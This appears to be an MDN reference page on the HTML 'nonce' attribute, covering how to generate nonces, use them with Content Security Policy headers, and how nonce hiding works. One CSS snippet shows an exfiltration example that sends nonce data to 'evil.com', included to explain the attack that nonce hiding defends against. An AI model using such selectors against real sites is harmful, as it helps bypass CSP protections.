nonce
=====

The `nonce` [global attribute](../global_attributes) is a content attribute defining a cryptographic nonce ("number used once") which can be used by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to determine whether or not a given fetch will be allowed to proceed for a given element.

Description
-----------

The `nonce` attribute is useful to allow-list specific elements, such as a particular inline script or style elements. It can help you to avoid using the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) `unsafe-inline` directive, which would allow-list *all* inline scripts or styles.

Note: Only use `nonce` for cases where you have no way around using unsafe inline script or style contents. If you don't need `nonce`, don't use it. If your script is static, you could also use a CSP hash instead. (See usage notes on [unsafe inline script](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).) Always try to take full advantage of [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) protections and avoid nonces or unsafe inline scripts whenever possible.

### Using nonce to allow-list a &lt;script&gt; element

There are a few steps involved to allow-list an inline script using the nonce mechanism:

#### Generating values

From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:

    const crypto = require('crypto');
    crypto.randomBytes(16).toString('base64');
    // '8IBTHwOdqNKAWeKl7plt8g=='

#### Allow-listing inline script

The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:

    <script nonce="8IBTHwOdqNKAWeKl7plt8g==">…</script>

#### Sending a nonce with a CSP header

Finally, you'll need to send the nonce value in a [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) header (prepend `nonce-`):

    Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='

### Accessing nonces and nonce hiding

For security reasons, the `nonce` content attribute is hidden (an empty string will be returned).

    script.getAttribute('nonce'); // returns empty string

The [`nonce`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce) property is the only way to access nonces:

    script.nonce; // returns nonce value

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:

    script[nonce~=whatever] {
      background: url("https://evil.com/nonce?whatever");
    }

Specifications
--------------

<table><thead><tr class="header"><th>Specification</th></tr></thead><tbody><tr class="odd"><td><a href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce">HTML Living Standard<br />
<span class="small">The definition of 'nonce' in that specification.</span></a></td></tr></tbody></table>

Browser compatibility
---------------------

Desktop

Mobile

Chrome

Edge

Firefox

Internet Explorer

Opera

Safari

WebView Android

Chrome Android

Firefox for Android

Opera Android

Safari on IOS

Samsung Internet

`nonce`

Yes

Yes

31

No

Yes

Yes

Yes

Yes

31

Yes

Yes

Yes

`nonce_hiding`

61

79

75

No

48

No

See [bug 179728](https://webkit.org/b/179728)

61

61

79

45

No

See [bug 179728](https://webkit.org/b/179728)

8.0

See also
--------

-   [`HTMLOrForeignElement.nonce`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce)
-   [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
-   CSP: [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)

<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce</a>
